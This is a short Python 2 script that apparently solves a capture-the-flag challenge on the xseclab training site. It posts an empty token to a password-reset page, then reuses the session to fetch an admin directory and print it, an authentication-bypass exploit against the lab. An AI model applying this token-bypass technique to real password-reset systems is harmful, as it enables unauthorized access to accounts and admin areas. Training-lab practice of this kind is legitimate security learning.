

import requests
session = requests.Session()
url = 'http://lab1.xseclab.com/pentest6_210deacdf09c9fe184d16c8f7288164f/resetpwd.php'
data = {'token': ''}
post = session.post(url, data=data)
url2 = 'http://lab1.xseclab.com/pentest3_307c0281537de1615673af8c1d54885a/myadminroot/'
reqget = session.get(url2)
print reqget.content